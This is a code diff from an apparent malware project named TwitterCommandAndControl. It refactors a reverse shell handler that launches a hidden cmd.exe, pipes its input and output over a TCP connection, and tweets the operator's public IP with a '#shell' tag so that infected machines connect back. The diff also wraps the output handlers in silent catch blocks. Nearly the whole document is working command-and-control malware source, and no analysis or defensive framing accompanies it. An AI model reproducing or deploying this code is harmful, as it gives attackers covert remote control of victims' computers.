@@ -9,12 +9,13 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using TwitterCommandAndControl;
+using TwitterCommandAndControl.Core;
 
-namespace TwitterCommandAndControl
+namespace TwitterCommandAndControl.Handlers
 {
-    public static class ReverseShellHandler
-    {
-        private const int PORT = 8888;
+    public class ReverseShellHandler : Handler
+    {   
+        private ReverseShellHandler() : base() { }
 
         public static void Respond(string command)
         {
@@ -37,7 +38,6 @@ namespace TwitterCommandAndControl
                         using (streamWriter = new StreamWriter(networkStream))
                         using (processCmd = new Process())
                         {
-
                             processCmd.StartInfo.FileName = "cmd.exe";
                             processCmd.StartInfo.CreateNoWindow = true;
                             processCmd.StartInfo.UseShellExecute = false;
@@ -46,19 +46,27 @@ namespace TwitterCommandAndControl
                             processCmd.StartInfo.RedirectStandardError = true;
                             processCmd.OutputDataReceived += (x, y) =>
                             {
-                                if (streamWriter.BaseStream != null && streamWriter.BaseStream.CanWrite)
+                                try
                                 {
-                                    streamWriter.WriteLine(y.Data);
-                                    streamWriter.Flush();
+                                    if (streamWriter.BaseStream != null && streamWriter.BaseStream.CanWrite)
+                                    {
+                                        streamWriter.WriteLine(y.Data);
+                                        streamWriter.Flush();
+                                    }
                                 }
+                                catch { }
                             };
                             processCmd.ErrorDataReceived += (x, y) =>
                             {
-                                if (streamWriter.BaseStream != null && streamWriter.BaseStream.CanWrite)
+                                try
                                 {
-                                    streamWriter.WriteLine(y.Data);
-                                    streamWriter.Flush();
+                                    if (streamWriter.BaseStream != null && streamWriter.BaseStream.CanWrite)
+                                    {
+                                        streamWriter.WriteLine(y.Data);
+                                        streamWriter.Flush();
+                                    }
                                 }
+                                catch { }
                             };
                             processCmd.Start();
                             processCmd.BeginOutputReadLine();
@@ -119,22 +127,16 @@ namespace TwitterCommandAndControl
                     }
                 }
                 catch { }
+                finally { }
             }
         }
 
         public static TcpClient Request(string commandPrefix)
         {
-            TcpClient client = null;
-            var listenerTask = Task.Factory.StartNew(() =>
-            {
-                TcpListener listener = new TcpListener(IPAddress.Any, PORT);
-                listener.Start();
-                client = listener.AcceptTcpClient();
-                listener.Stop();
-            });
+            var listenerTask = NextClient();
             Messenger.Send(commandPrefix + " #shell #ip=" + GetPublicIP.GetIP());
             listenerTask.Wait();
-            return client;
+            return listenerTask.Result;
         }
     }
 }
